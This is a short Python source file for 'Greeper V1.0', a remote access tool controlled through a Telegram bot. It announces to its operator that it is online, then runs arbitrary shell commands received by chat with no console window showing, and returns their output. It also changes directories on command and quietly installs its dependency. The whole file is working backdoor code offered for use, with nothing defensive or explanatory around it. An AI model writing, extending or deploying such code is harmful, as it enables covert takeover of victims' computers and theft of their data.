#GREEPER V1.0

import os
import time
import subprocess as sp
try:import telebot
except:os.system("pip install telebot")

bot = telebot.TeleBot("YOUR_BOT_TOKEN")
user = "YOUR_USER_ID"

bot.send_message(user,"Greeper is online!")

@bot.message_handler(commands=["cmd"])
def cmd(msg):
    cmd = msg.text.partition(" ")[2]
    if cmd != "":
        try:
            if cmd.startswith("cd"):
                cmd = cmd.partition(" ")[2]
                if cmd == "":
                    bot.send_message(msg.chat.id, os.getcwd())
                else:
                    os.chdir(cmd)
                    bot.send_message(msg.chat.id, os.getcwd())
            else:
                os.system(cmd)
                result = sp.Popen(cmd, stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,text=True, creationflags=sp.CREATE_NO_WINDOW)
                out, err = result.communicate()
                result.wait()
                if not err:
                    if out: bot.send_message(msg.chat.id, out)
                    else: bot.send_message(msg.chat.id, "Command executed sucessfully without Output!")
                else:
                    bot.send_message(msg.chat.id, err)
        except Exception as e:
            bot.send_message(msg.chat.id, "Some error occured!\n\n"+str(e))
    else:
        bot.send_message(msg.chat.id, "Parameter required!")

@bot.message_handler(commands=['terminate'])
def terminate(message):
    bot.send_message(user,"Greeper is offline!")
    term = 1
    bot.stop_polling()
    exit()

bot.polling(non_stop=True)
